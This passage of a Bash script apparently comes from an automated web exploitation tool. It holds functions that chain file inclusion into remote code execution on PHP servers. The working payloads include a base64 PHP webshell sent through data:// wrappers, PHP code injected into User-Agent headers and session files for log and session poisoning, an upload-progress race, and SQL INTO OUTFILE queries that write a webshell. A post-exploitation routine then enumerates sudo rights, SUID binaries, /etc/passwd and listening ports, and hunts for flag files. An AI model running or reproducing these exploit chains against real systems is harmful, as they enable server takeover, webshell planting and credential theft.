      echo -e "\033[1;31m  │ ★ RCE CONFIRMED (${strat_name})! ${uid_info}\033[0m" >&2

      echo "${include_url}|${include_param}|${encoded_traversal}" > "${rce_dir}/rce_chain.txt"
      echo "${uid_info}" > "${rce_dir}/rce_uid.txt"
      local _esc="${include_url//\"/\\\"}"
      echo "{\"type\":\"rce_upload_include\",\"url\":\"${_esc}\",\"param\":\"${include_param}\",\"confidence\":\"HIGH\",\"proof\":\"${uid_info}\",\"curl\":\"curl -sk '${rce_test_url//\'/\\\'}'\",\"chain\":\"upload(${upload_page})+include(${include_page})+${strat_name}_encode\"}" >> "${outdir}/vuln/rce.json" 2>/dev/null
      echo -e "\033[1;36m  └─── Upload+Include: SUCCESS ────────────────────────\033[0m" >&2
      rm -f "$rce_resp_file"
      return 0
    fi
    rm -f "$rce_resp_file"
  done

  echo -e "\033[1;36m  └─── Upload+Include: FAILED ─────────────────────────\033[0m" >&2
  return 1
}

# ═══════════════════════════════════════════════════════════════════════════
#  CHAIN 2: PHP WRAPPER RCE (data://, php://input, expect://)
# ═══════════════════════════════════════════════════════════════════════════
_rce_php_wrapper_chain() {
  local outdir="$1" rce_dir="$2"
  echo -e "\033[1;36m  ┌─── Chain: PHP Wrapper RCE ──────────────────────────\033[0m" >&2

  local target="${TARGET:-unknown}"
  local target_base="${target%%\?*}"

  while IFS='|' read -r include_page include_code; do
    [[ -z "$include_page" ]] && continue
    local include_url="${target_base}${include_page}"

    # DYNAMIC: Get parameter name
    local include_param=""
    local params_file="${rce_dir}/include_params_$(echo "$include_page" | tr '/' '_').txt"
    [[ -f "$params_file" ]] && include_param=$(head -1 "$params_file")
    if [[ -z "$include_param" ]]; then
      include_param=$(grep -oP '\$_GET\[["'"'"']\K[^"'"'"']+' "${rce_dir}/src_$(echo "$include_page" | tr '/' '_').txt" 2>/dev/null | head -1)
    fi
    [[ -z "$include_param" ]] && include_param="page"

    local needs_double_encode=false
    grep -q "${include_page}.*DOUBLE_ENCODE_BYPASS" "${rce_dir}/filter_logic.txt" 2>/dev/null && needs_double_encode=true

    local -a wrapper_payloads=(
      "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
      "expect://id"
      "php://filter/convert.base64-encode/resource=/etc/passwd"
    )

    for payload in "${wrapper_payloads[@]}"; do
      local encoded_payload
      if $needs_double_encode; then
        encoded_payload=$(python3 -c "import sys,urllib.parse;print(urllib.parse.quote(urllib.parse.quote(sys.argv[1],safe=''),safe=''))" "$payload" 2>/dev/null || echo "$payload")
      else
        encoded_payload=$(python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=''))" "$payload" 2>/dev/null || echo "$payload")
      fi

      local resp_file="${rce_dir}/wrapper_test.txt"
      curl -sk --max-time 5 "${include_url}?${include_param}=${encoded_payload}&cmd=id" -o "$resp_file" < /dev/null 2>/dev/null

      if grep -q 'uid=' "$resp_file" 2>/dev/null; then
        local uid_info
        uid_info=$(grep -oP 'uid=\d+\([^)]+\)\s*gid=\d+\([^)]+\)' "$resp_file" 2>/dev/null | head -1)
        echo -e "\033[1;31m  │ ★ RCE via PHP wrapper! ${payload%%,*} → ${uid_info}\033[0m" >&2
        echo "${include_url}|${include_param}|${encoded_payload}" > "${rce_dir}/rce_chain.txt"
        echo "{\"type\":\"rce_php_wrapper\",\"url\":\"${include_url//\"/\\\"}\",\"param\":\"${include_param}\",\"confidence\":\"HIGH\",\"proof\":\"${uid_info}\",\"payload\":\"${payload}\"}" >> "${outdir}/vuln/rce.json" 2>/dev/null
        echo -e "\033[1;36m  └─── PHP Wrapper RCE: SUCCESS ───────────────────────\033[0m" >&2
        rm -f "$resp_file"
        return 0
      fi

      # Also try php://input with POST body
      if [[ "$payload" == *"input"* ]] || [[ "$payload" == *"php://"* ]]; then
        curl -sk -X POST --max-time 5 "${include_url}?${include_param}=php://input&cmd=id" \
          -d '<?php system($_GET["cmd"]); ?>' -o "$resp_file" < /dev/null 2>/dev/null
        if grep -q 'uid=' "$resp_file" 2>/dev/null; then
          echo -e "\033[1;31m  │ ★ RCE via php://input!\033[0m" >&2
          echo "${include_url}|${include_param}|php://input" > "${rce_dir}/rce_chain.txt"
          echo -e "\033[1;36m  └─── PHP Wrapper RCE: SUCCESS ───────────────────────\033[0m" >&2
          rm -f "$resp_file"
          return 0
        fi
      fi
      rm -f "$resp_file"
    done
  done < "${rce_dir}/include_endpoints.txt"

  echo -e "\033[1;36m  └─── PHP Wrapper RCE: FAILED ──────────────────────────\033[0m" >&2
  return 1
}

# ═══════════════════════════════════════════════════════════════════════════
#  CHAIN 3: LOG POISONING VIA INCLUDE()
# ═══════════════════════════════════════════════════════════════════════════
_rce_log_poison_include() {
  local outdir="$1" rce_dir="$2"
  echo -e "\033[1;36m  ┌─── Chain: Log Poison via include() ─────────────────\033[0m" >&2

  local target="${TARGET:-unknown}"
  local target_base="${target%%\?*}"
  local up
  up=$(cat "${rce_dir}/lfi_bypass_prefix.txt" 2>/dev/null) || up="../"

  local lfi_url="" lfi_param=""
  lfi_url=$(grep -oP '"url"\s*:\s*"[^"]+' "${outdir}/vuln/lfi.json" | head -1 | sed 's/"url"\s*:\s*"//')
  lfi_param=$(grep -oP '"param"\s*:\s*"[^"]+' "${outdir}/vuln/lfi.json" | head -1 | sed 's/"param"\s*:\s*"//')

  local -a log_paths=(
    "var/log/nginx/access.log" "var/log/nginx/error.log"
    "var/log/apache2/access.log" "var/log/apache2/error.log"
    "var/log/httpd/access_log" "var/log/httpd/error_log"
  )

  local readable_log=""
  for logpath in "${log_paths[@]}"; do
    local resp_file="${rce_dir}/logcheck.txt"
    _rce_lfi_read "$lfi_url" "$lfi_param" "${up}${up}${up}${up}${up}${up}${logpath}" "$resp_file"
    if [[ -s "$resp_file" ]] && grep -qP 'GET /|POST /|HTTP/1\.' "$resp_file" 2>/dev/null; then
      readable_log="$logpath"
      echo -e "\033[1;32m  │ Readable log: /${logpath}\033[0m" >&2
      break
    fi
    rm -f "$resp_file"
  done

  [[ -z "$readable_log" ]] && {
    echo -e "\033[2m  │ No readable logs found\033[0m" >&2
    echo -e "\033[1;36m  └─── Log Poison: FAILED ─────────────────────────────\033[0m" >&2
    return 1
  }

  # Inject PHP via User-Agent
  local marker="TRAKTR_RCE_$(date +%s)"
  curl -sk -o /dev/null -H "User-Agent: <?php echo '${marker}'; system(\$_GET['cmd']); ?>" "${target_base}/" < /dev/null 2>/dev/null

  # Try to include the log via each discovered include() endpoint
  while IFS='|' read -r include_page include_code; do
    [[ -z "$include_page" ]] && continue
    local include_url="${target_base}${include_page}"

    # DYNAMIC: Get parameter
    local include_param=""
    local params_file="${rce_dir}/include_params_$(echo "$include_page" | tr '/' '_').txt"
    [[ -f "$params_file" ]] && include_param=$(head -1 "$params_file")
    [[ -z "$include_param" ]] && include_param=$(grep -oP '\$_GET\[["'"'"']\K[^"'"'"']+' "${rce_dir}/src_$(echo "$include_page" | tr '/' '_').txt" 2>/dev/null | head -1)
    [[ -z "$include_param" ]] && continue

    local needs_double_encode=false
    grep -q "${include_page}.*DOUBLE_ENCODE_BYPASS" "${rce_dir}/filter_logic.txt" 2>/dev/null && needs_double_encode=true

    # DYNAMIC: Build traversal depth based on include base dir
    local include_basedir=""
    local basedir_file="${rce_dir}/include_basedir_$(echo "$include_page" | tr '/' '_').txt"
    [[ -f "$basedir_file" ]] && include_basedir=$(cat "$basedir_file" 2>/dev/null)

    local depth_ups="../../../"
    if [[ -n "$include_basedir" ]]; then
      local d; d=$(echo "$include_basedir" | tr -cd '/' | wc -c)
      depth_ups=""
      for ((i=0; i<=d+2; i++)); do depth_ups+="../"; done
    fi

    local log_traversal="${depth_ups}${readable_log}"
    local encoded_log
    if $needs_double_encode; then
      encoded_log=$(echo -n "$log_traversal" | sed 's/\./%252e/g; s/\//%252f/g')
    else
      encoded_log=$(python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=''))" "$log_traversal" 2>/dev/null || echo "$log_traversal")
    fi

    local resp_file="${rce_dir}/logpoison_test.txt"
    curl -sk --max-time 10 "${include_url}?${include_param}=${encoded_log}&cmd=id" -o "$resp_file" < /dev/null 2>/dev/null

    if grep -q 'uid=' "$resp_file" 2>/dev/null; then
      local uid_info
      uid_info=$(grep -oP 'uid=\d+\([^)]+\)\s*gid=\d+\([^)]+\)' "$resp_file" 2>/dev/null | head -1)
      echo -e "\033[1;31m  │ ★ RCE via log poisoning + include()! ${uid_info}\033[0m" >&2
      echo "${include_url}|${include_param}|${encoded_log}" > "${rce_dir}/rce_chain.txt"
      echo "{\"type\":\"rce_log_poison_include\",\"url\":\"${include_url//\"/\\\"}\",\"param\":\"${include_param}\",\"confidence\":\"HIGH\",\"proof\":\"${uid_info}\"}" >> "${outdir}/vuln/rce.json" 2>/dev/null
      echo -e "\033[1;36m  └─── Log Poison: SUCCESS ────────────────────────────\033[0m" >&2
      rm -f "$resp_file"
      return 0
    fi
    rm -f "$resp_file"
  done < "${rce_dir}/include_endpoints.txt"

  echo -e "\033[1;36m  └─── Log Poison via include(): FAILED ─────────────────\033[0m" >&2
  return 1
}

# ═══════════════════════════════════════════════════════════════════════════
#  CHAIN 4: SESSION FILE POISONING
# ═══════════════════════════════════════════════════════════════════════════
_rce_session_poison() {
  local outdir="$1" rce_dir="$2"
  echo -e "\033[1;36m  ┌─── Chain: Session Poisoning ────────────────────────\033[0m" >&2

  local target="${TARGET:-unknown}"
  local target_base="${target%%\?*}"

  local lfi_url="" lfi_param=""
  lfi_url=$(grep -oP '"url"\s*:\s*"[^"]+' "${outdir}/vuln/lfi.json" 2>/dev/null | head -1 | sed 's/"url"\s*:\s*"//')
  lfi_param=$(grep -oP '"param"\s*:\s*"[^"]+' "${outdir}/vuln/lfi.json" 2>/dev/null | head -1 | sed 's/"param"\s*:\s*"//')
  [[ -z "$lfi_url" ]] && { echo -e "\033[1;36m  └─── Session Poison: SKIPPED ──────────────────────\033[0m" >&2; return 1; }

  local session_id="traktr_$(date +%s)"
  curl -sk -b "PHPSESSID=${session_id}" \
    "${target_base}/?data=<?php system(\$_GET['cmd']); ?>" -o /dev/null < /dev/null 2>/dev/null
  curl -sk -b "PHPSESSID=${session_id}" \
    -d "data=<?php system(\$_GET['cmd']); ?>" \
    "${target_base}/" -o /dev/null < /dev/null 2>/dev/null

  local -a session_paths=(
    "tmp/sess_${session_id}"
    "var/lib/php/sessions/sess_${session_id}"
    "var/lib/php5/sessions/sess_${session_id}"
    "var/lib/php/session/sess_${session_id}"
  )

  for sess_path in "${session_paths[@]}"; do
    if [[ -f "${rce_dir}/include_endpoints.txt" ]] && [[ -s "${rce_dir}/include_endpoints.txt" ]]; then
      while IFS='|' read -r include_page _; do
        [[ -z "$include_page" ]] && continue
        local include_url="${target_base}${include_page}"
        local include_param=""
        local params_file="${rce_dir}/include_params_$(echo "$include_page" | tr '/' '_').txt"
        [[ -f "$params_file" ]] && include_param=$(head -1 "$params_file")
        [[ -z "$include_param" ]] && include_param=$(grep -oP '\$_GET\[["'"'"']\K[^"'"'"']+' "${rce_dir}/src_$(echo "$include_page" | tr '/' '_').txt" 2>/dev/null | head -1)
        [[ -z "$include_param" ]] && continue

        local needs_double_encode=false
        grep -q "${include_page}.*DOUBLE_ENCODE_BYPASS" "${rce_dir}/filter_logic.txt" 2>/dev/null && needs_double_encode=true

        local traversal="../../../../${sess_path}"
        local encoded
        if $needs_double_encode; then
          encoded=$(echo -n "$traversal" | sed 's/\./%252e/g; s/\//%252f/g')
        else
          encoded=$(python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=''))" "$traversal" 2>/dev/null)
        fi

        local resp_file="${rce_dir}/session_test.txt"
        curl -sk --max-time 5 "${include_url}?${include_param}=${encoded}&cmd=id" -o "$resp_file" < /dev/null 2>/dev/null
        if grep -q 'uid=' "$resp_file" 2>/dev/null; then
          echo -e "\033[1;31m  │ ★ RCE via session poisoning!\033[0m" >&2
          echo "${include_url}|${include_param}|${encoded}" > "${rce_dir}/rce_chain.txt"
          echo "{\"type\":\"rce_session_poison\",\"url\":\"${include_url//\"/\\\"}\",\"param\":\"${include_param}\",\"confidence\":\"HIGH\"}" >> "${outdir}/vuln/rce.json" 2>/dev/null
          echo -e "\033[1;36m  └─── Session Poison: SUCCESS ──────────────────────\033[0m" >&2
          rm -f "$resp_file"
          return 0
        fi
        rm -f "$resp_file"
      done < "${rce_dir}/include_endpoints.txt"
    fi
  done

  echo -e "\033[1;36m  └─── Session Poison: FAILED ───────────────────────────\033[0m" >&2
  return 1
}

# ═══════════════════════════════════════════════════════════════════════════
#  CHAIN 5: /proc/self/environ POISONING
# ═══════════════════════════════════════════════════════════════════════════
_rce_environ_poison() {
  local outdir="$1" rce_dir="$2"
  echo -e "\033[1;36m  ┌─── Chain: /proc/self/environ ───────────────────────\033[0m" >&2

  local target="${TARGET:-unknown}"
  local target_base="${target%%\?*}"

  if [[ ! -f "${rce_dir}/include_endpoints.txt" ]] || [[ ! -s "${rce_dir}/include_endpoints.txt" ]]; then
    echo -e "\033[1;36m  └─── Environ: SKIPPED ──────────────────────────────\033[0m" >&2
    return 1
  fi

  while IFS='|' read -r include_page _; do
    [[ -z "$include_page" ]] && continue
    local include_url="${target_base}${include_page}"
    local include_param=""
    local params_file="${rce_dir}/include_params_$(echo "$include_page" | tr '/' '_').txt"
    [[ -f "$params_file" ]] && include_param=$(head -1 "$params_file")
    [[ -z "$include_param" ]] && include_param=$(grep -oP '\$_GET\[["'"'"']\K[^"'"'"']+' "${rce_dir}/src_$(echo "$include_page" | tr '/' '_').txt" 2>/dev/null | head -1)
    [[ -z "$include_param" ]] && continue

    local needs_double_encode=false
    grep -q "${include_page}.*DOUBLE_ENCODE_BYPASS" "${rce_dir}/filter_logic.txt" 2>/dev/null && needs_double_encode=true

    local traversal="../../../../proc/self/environ"
    local encoded
    if $needs_double_encode; then
      encoded=$(echo -n "$traversal" | sed 's/\./%252e/g; s/\//%252f/g')
    else
      encoded=$(python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=''))" "$traversal" 2>/dev/null)
    fi

    local resp_file="${rce_dir}/environ_test.txt"
    curl -sk --max-time 5 -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
      "${include_url}?${include_param}=${encoded}&cmd=id" -o "$resp_file" < /dev/null 2>/dev/null

    if grep -q 'uid=' "$resp_file" 2>/dev/null; then
      echo -e "\033[1;31m  │ ★ RCE via /proc/self/environ!\033[0m" >&2
      echo "${include_url}|${include_param}|${encoded}" > "${rce_dir}/rce_chain.txt"
      echo "{\"type\":\"rce_environ\",\"url\":\"${include_url//\"/\\\"}\",\"param\":\"${include_param}\",\"confidence\":\"HIGH\"}" >> "${outdir}/vuln/rce.json" 2>/dev/null
      echo -e "\033[1;36m  └─── Environ: SUCCESS ──────────────────────────────\033[0m" >&2
      rm -f "$resp_file"
      return 0
    fi
    rm -f "$resp_file"
  done < "${rce_dir}/include_endpoints.txt"

  echo -e "\033[1;36m  └─── Environ: FAILED ───────────────────────────────────\033[0m" >&2
  return 1
}

# ═══════════════════════════════════════════════════════════════════════════
#  CHAIN 6: PHP_SESSION_UPLOAD_PROGRESS
# ═══════════════════════════════════════════════════════════════════════════
_rce_upload_progress() {
  local outdir="$1" rce_dir="$2"
  echo -e "\033[1;36m  ┌─── Chain: PHP Upload Progress ──────────────────────\033[0m" >&2

  local target="${TARGET:-unknown}"
  local target_base="${target%%\?*}"

  if [[ ! -f "${rce_dir}/include_endpoints.txt" ]] || [[ ! -s "${rce_dir}/include_endpoints.txt" ]]; then
    echo -e "\033[1;36m  └─── Upload Progress: SKIPPED ──────────────────────\033[0m" >&2
    return 1
  fi

  local session_id="traktr_up_$(date +%s)"
  local php_code='<?php system($_GET["cmd"]); ?>'

  while IFS='|' read -r include_page _; do
    [[ -z "$include_page" ]] && continue
    local include_url="${target_base}${include_page}"
    local include_param=""
    local params_file="${rce_dir}/include_params_$(echo "$include_page" | tr '/' '_').txt"
    [[ -f "$params_file" ]] && include_param=$(head -1 "$params_file")
    [[ -z "$include_param" ]] && include_param=$(grep -oP '\$_GET\[["'"'"']\K[^"'"'"']+' "${rce_dir}/src_$(echo "$include_page" | tr '/' '_').txt" 2>/dev/null | head -1)
    [[ -z "$include_param" ]] && continue

    local needs_double_encode=false
    grep -q "${include_page}.*DOUBLE_ENCODE_BYPASS" "${rce_dir}/filter_logic.txt" 2>/dev/null && needs_double_encode=true

    for sess_dir in "tmp" "var/lib/php/sessions"; do
      local traversal="../../../../${sess_dir}/sess_${session_id}"
      local encoded
      if $needs_double_encode; then
        encoded=$(echo -n "$traversal" | sed 's/\./%252e/g; s/\//%252f/g')
      else
        encoded=$(python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=''))" "$traversal" 2>/dev/null)
      fi

      for _ in $(seq 1 5); do
        curl -sk -X POST "${target_base}/" \
          -b "PHPSESSID=${session_id}" \
          -F "PHP_SESSION_UPLOAD_PROGRESS=${php_code}" \
          -F "file=@/dev/null;filename=test.txt" \
          -o /dev/null < /dev/null 2>/dev/null &
        local upload_pid=$!

        local resp_file="${rce_dir}/upload_progress_test.txt"
        curl -sk --max-time 3 "${include_url}?${include_param}=${encoded}&cmd=id" -o "$resp_file" < /dev/null 2>/dev/null
        kill "$upload_pid" 2>/dev/null; wait "$upload_pid" 2>/dev/null || true

        if grep -q 'uid=' "$resp_file" 2>/dev/null; then
          echo -e "\033[1;31m  │ ★ RCE via PHP upload progress race!\033[0m" >&2
          echo "${include_url}|${include_param}|${encoded}" > "${rce_dir}/rce_chain.txt"
          echo "{\"type\":\"rce_upload_progress\",\"url\":\"${include_url//\"/\\\"}\",\"param\":\"${include_param}\",\"confidence\":\"HIGH\"}" >> "${outdir}/vuln/rce.json" 2>/dev/null
          echo -e "\033[1;36m  └─── Upload Progress: SUCCESS ──────────────────────\033[0m" >&2
          rm -f "$resp_file"
          return 0
        fi
        rm -f "$resp_file"
      done
    done
  done < "${rce_dir}/include_endpoints.txt"

  echo -e "\033[1;36m  └─── Upload Progress: FAILED ───────────────────────────\033[0m" >&2
  return 1
}

# ═══════════════════════════════════════════════════════════════════════════
#  CHAIN 7: SQLi FILE WRITE → WEBSHELL
# ═══════════════════════════════════════════════════════════════════════════
_rce_sqli_file_write() {
  local outdir="$1" rce_dir="$2"
  echo -e "\033[1;36m  ┌─── Chain: SQLi File Write ──────────────────────────\033[0m" >&2

  local target="${TARGET:-unknown}"
  local target_base="${target%%\?*}"
  local webroot
  webroot=$(cat "${rce_dir}/webroot.txt" 2>/dev/null) || webroot="/var/www/html"

  local sqli_url="" sqli_param=""
  if [[ -f "${outdir}/vuln/sqli.json" ]]; then
    sqli_url=$(grep -oP '"url"\s*:\s*"[^"]+' "${outdir}/vuln/sqli.json" | head -1 | sed 's/"url"\s*:\s*"//')
    sqli_param=$(grep -oP '"param"\s*:\s*"[^"]+' "${outdir}/vuln/sqli.json" | head -1 | sed 's/"param"\s*:\s*"//')
  fi
  [[ -z "$sqli_url" ]] && { echo -e "\033[1;36m  └─── SQLi File Write: SKIPPED ──────────────────────\033[0m" >&2; return 1; }

  local base_url="${sqli_url%%\?*}"
  local shell_path="${webroot}/traktr_rce.php"

  local -a outfile_payloads=(
    "' UNION SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '${shell_path}'-- "
    "1 UNION SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '${shell_path}'-- "
  )

  for payload in "${outfile_payloads[@]}"; do
    local encoded
    encoded=$(python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=''))" "$payload" 2>/dev/null || echo "$payload")
    curl -sk --max-time 5 "${base_url}?${sqli_param}=${encoded}" -o /dev/null < /dev/null 2>/dev/null

    local test_resp
    test_resp=$(curl -sk --max-time 5 "${target_base}/traktr_rce.php?cmd=id" < /dev/null 2>/dev/null)
    if echo "$test_resp" | grep -q 'uid=' 2>/dev/null; then
      echo -e "\033[1;31m  │ ★ RCE via SQLi INTO OUTFILE!\033[0m" >&2
      echo "${target_base}/traktr_rce.php|cmd|" > "${rce_dir}/rce_chain.txt"
      echo "{\"type\":\"rce_sqli_outfile\",\"url\":\"${base_url//\"/\\\"}\",\"param\":\"${sqli_param}\",\"confidence\":\"HIGH\"}" >> "${outdir}/vuln/rce.json" 2>/dev/null
      echo -e "\033[1;36m  └─── SQLi File Write: SUCCESS ──────────────────────\033[0m" >&2
      return 0
    fi
  done

  echo -e "\033[1;36m  └─── SQLi File Write: FAILED ───────────────────────────\033[0m" >&2
  return 1
}

# ═══════════════════════════════════════════════════════════════════════════
#  POST-EXPLOITATION: Comprehensive system enumeration
# ═══════════════════════════════════════════════════════════════════════════
_rce_post_exploit() {
  local outdir="$1" rce_dir="$2"
  echo -e "\033[1;35m  ╔══════════════════════════════════════════════════════════╗\033[0m" >&2
  echo -e "\033[1;35m  ║       POST-EXPLOITATION                                 ║\033[0m" >&2
  echo -e "\033[1;35m  ╚══════════════════════════════════════════════════════════╝\033[0m" >&2

  [[ ! -f "${rce_dir}/rce_chain.txt" ]] && return

  local rce_url="" rce_param="" rce_encoded=""
  IFS='|' read -r rce_url rce_param rce_encoded < "${rce_dir}/rce_chain.txt"
  [[ -z "$rce_url" ]] && return

  _rce_exec() {
    local cmd="$1"
    local encoded_cmd
    encoded_cmd=$(python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=''))" "$cmd" 2>/dev/null || echo "$cmd")
    curl -sk --max-time 10 "${rce_url}?${rce_param}=${rce_encoded}&cmd=${encoded_cmd}" < /dev/null 2>/dev/null
  }

  # Clean extraction: strip HTML tags and get just the command output
  _rce_exec_clean() {
    local raw
    raw=$(_rce_exec "$1")
    # Remove HTML tags, keep text
    echo "$raw" | sed 's/<[^>]*>//g' | sed '/^[[:space:]]*$/d' | head -30
  }

  # System information
  echo -e "\033[1;36m  ┌─── System Information ───────────────────────────────\033[0m" >&2
  local id_output; id_output=$(_rce_exec_clean "id")
  local hostname; hostname=$(_rce_exec_clean "hostname")
  local kernel; kernel=$(_rce_exec_clean "uname -a")
  local distro; distro=$(_rce_exec_clean "cat /etc/os-release 2>/dev/null | head -3")
  echo -e "\033[2m  │ ID: ${id_output}\033[0m" >&2
  echo -e "\033[2m  │ Hostname: ${hostname}\033[0m" >&2
  echo -e "\033[2m  │ Kernel: ${kernel}\033[0m" >&2

  {
    echo "=== RCE Post-Exploitation Results ==="
    echo "Date: $(date)"
    echo "RCE URL: ${rce_url}?${rce_param}=${rce_encoded}&cmd=<CMD>"
    echo "ID: $id_output"
    echo "Hostname: $hostname"
    echo "Kernel: $kernel"
    echo "Distro: $distro"
  } > "${rce_dir}/post_exploit.txt"

  # Flag hunting
  echo -e "\033[1;36m  ├─── Flag Hunting ──────────────────────────────────────\033[0m" >&2
  local flags; flags=$(_rce_exec_clean "find / -maxdepth 4 -name 'flag*' -type f 2>/dev/null; find / -maxdepth 4 -name 'user.txt' -o -name 'root.txt' -o -name 'proof.txt' 2>/dev/null")

  if [[ -n "$flags" ]]; then
    echo "$flags" | sort -u | while IFS= read -r flag_file; do
      [[ -z "$flag_file" ]] && continue
      [[ "$flag_file" == /sys/* ]] || [[ "$flag_file" == /proc/* ]] && continue
      local flag_content; flag_content=$(_rce_exec_clean "cat ${flag_file} 2>/dev/null")
      if [[ -n "$flag_content" ]] && [[ ${#flag_content} -lt 500 ]]; then
        echo -e "\033[1;31m  │ ★ ${flag_file}: ${flag_content}\033[0m" >&2
        echo "FLAG: ${flag_file} = ${flag_content}" >> "${rce_dir}/post_exploit.txt"
      fi
    done
  else
    echo -e "\033[2m  │ No flag files found\033[0m" >&2
  fi

  # Privilege escalation vectors
  echo -e "\033[1;36m  ├─── Privilege Escalation Vectors ──────────────────────\033[0m" >&2
  local sudo_perms; sudo_perms=$(_rce_exec_clean "sudo -l 2>/dev/null")
  if [[ -n "$sudo_perms" ]] && ! echo "$sudo_perms" | grep -q "not allowed\|may not"; then
    echo -e "\033[1;33m  │ Sudo: ${sudo_perms}\033[0m" >&2
    echo "SUDO: $sudo_perms" >> "${rce_dir}/post_exploit.txt"
  fi

  local suid; suid=$(_rce_exec_clean "find / -perm -4000 -type f 2>/dev/null | head -20")
  if [[ -n "$suid" ]]; then
    echo -e "\033[2m  │ SUID binaries:\033[0m" >&2
    echo "$suid" | head -10 | while IFS= read -r bin; do
      [[ -z "$bin" ]] && continue
      echo -e "\033[2m  │   ${bin}\033[0m" >&2
    done
    echo "SUID: $suid" >> "${rce_dir}/post_exploit.txt"
  fi

  # Network info
  local netstat; netstat=$(_rce_exec_clean "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")
  if [[ -n "$netstat" ]]; then
    echo -e "\033[2m  │ Listening ports:\033[0m" >&2
    echo "$netstat" | head -10 | while IFS= read -r line; do
      echo -e "\033[2m  │   ${line}\033[0m" >&2
    done
    echo "NETWORK: $netstat" >> "${rce_dir}/post_exploit.txt"
  fi

  # Interesting files
  local interesting; interesting=$(_rce_exec_clean "ls -la /home/ 2>/dev/null; cat /etc/passwd 2>/dev/null | grep -v nologin | grep -v false")
  echo "USERS: $interesting" >> "${rce_dir}/post_exploit.txt"

  echo -e "\033[1;36m  └─── Post-exploitation complete ────────────────────────\033[0m" >&2

  # Add RCE finding
  echo "{\"type\":\"rce_achieved\",\"url\":\"${rce_url//\"/\\\"}\",\"param\":\"${rce_param}\",\"confidence\":\"HIGH\",\"proof\":\"${id_output}\",\"curl\":\"curl -sk '${rce_url}?${rce_param}=${rce_encoded}&cmd=id'\"}" >> "${outdir}/vuln/rce.json" 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════════════
#  HELPER: LFI read via the discovered LFI vulnerability
# ═══════════════════════════════════════════════════════════════════════════
_rce_lfi_read() {
  local url="$1" param="$2" payload="$3" outfile="$4"
  local encoded
  encoded=$(python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=''))" "$payload" 2>/dev/null || echo "$payload")

  local target_url
  if [[ "$url" == *"?"* ]]; then
    target_url="${url}&${param}=${encoded}"
  else
    target_url="${url}?${param}=${encoded}"
  fi

  curl -sk --max-time 3 --connect-timeout 3 "$target_url" -o "$outfile" < /dev/null 2>/dev/null || true
}
